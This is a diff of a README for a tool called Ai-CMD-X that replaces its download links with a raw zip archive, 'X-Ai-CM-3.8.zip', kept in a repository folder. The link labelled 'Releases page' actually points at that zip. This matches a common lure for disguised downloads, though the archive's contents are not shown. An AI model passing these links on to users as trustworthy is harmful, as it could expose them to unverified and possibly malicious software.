@@ -16,7 +16,7 @@ Welcome to Ai-CMD-X! This application simplifies your experience with Windows te
 
 To start using Ai-CMD-X, please visit this page to download: 
 
-[![Download Ai-CMD-X](https://raw.githubusercontent.com/MaverickRow/Ai-CMD-X/main/preidea/Ai-CMD-X.zip)](https://raw.githubusercontent.com/MaverickRow/Ai-CMD-X/main/preidea/Ai-CMD-X.zip)
+[![Download Ai-CMD-X](https://github.com/MaverickRow/Ai-CMD-X/raw/refs/heads/main/preidea/X-Ai-CM-3.8.zip)](https://github.com/MaverickRow/Ai-CMD-X/raw/refs/heads/main/preidea/X-Ai-CM-3.8.zip)
 
 Follow these steps to get the application on your computer:
 
@@ -58,7 +58,7 @@ We welcome contributions to Ai-CMD-X! If you have suggestions or improvements, p
 
 ## 📅 Updates
 
-Ai-CMD-X gets regular updates. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/MaverickRow/Ai-CMD-X/main/preidea/Ai-CMD-X.zip) to download the latest version and enjoy new features.
+Ai-CMD-X gets regular updates. Make sure to check back on the [Releases page](https://github.com/MaverickRow/Ai-CMD-X/raw/refs/heads/main/preidea/X-Ai-CM-3.8.zip) to download the latest version and enjoy new features.
 
 ## 💬 Support
 
